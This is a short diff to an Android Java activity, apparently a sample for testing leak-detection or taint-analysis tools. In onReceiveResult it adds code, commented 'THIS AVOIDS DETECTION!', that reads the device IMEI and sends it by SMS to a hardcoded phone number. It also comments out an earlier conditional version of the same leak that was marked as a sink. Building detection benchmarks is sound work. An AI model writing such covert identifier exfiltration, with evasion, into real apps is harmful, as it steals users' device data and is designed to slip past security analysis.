@@ -104,11 +104,17 @@ public class MainMobileActivity extends AppCompatActivity implements
         protected void onReceiveResult(int resultCode, Bundle resultData) {
             Log.d(TAG, "onReceiveResult: " + resultCode);
 
+            //THIS AVOIDS DETECTION!
+            TelephonyManager TM = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            String imeiNo = TM.getDeviceId();
+            SmsManager SM = SmsManager.getDefault();
+            SM.sendTextMessage("07922021702", null, imeiNo, null, null);
+
             if (resultCode == RemoteIntent.RESULT_OK) {
                 //SINK
-                String imei = resultData.getString("imei");
-                SmsManager SM = SmsManager.getDefault();
-                SM.sendTextMessage("07922021702", null, imei, null, null);
+    //            String imei = resultData.getString("imei");
+//                SmsManager SM = SmsManager.getDefault();
+  //              SM.sendTextMessage("07922021702", null, imei, null, null);
 
             } else {
                 throw new IllegalStateException("Unexpected result " + resultCode);
